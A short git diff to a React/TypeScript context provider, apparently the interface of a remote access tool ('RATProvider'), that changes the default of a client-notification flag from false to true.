@@ -9,7 +9,7 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
   const [port, setPort] = useState<string>("1337");
   const [running, setRunning] = useState<boolean>(false);
   const [clientList, setClientList] = useState<RATClient[]>([]);
-  const [notificationClient, setNotificationClient] = useState<boolean>(false);
+  const [notificationClient, setNotificationClient] = useState<boolean>(true);
   const notificationClientRef = useRef(false);
   const [listenClientNotif, setListenClientNotif] = useState<boolean>(false);
 
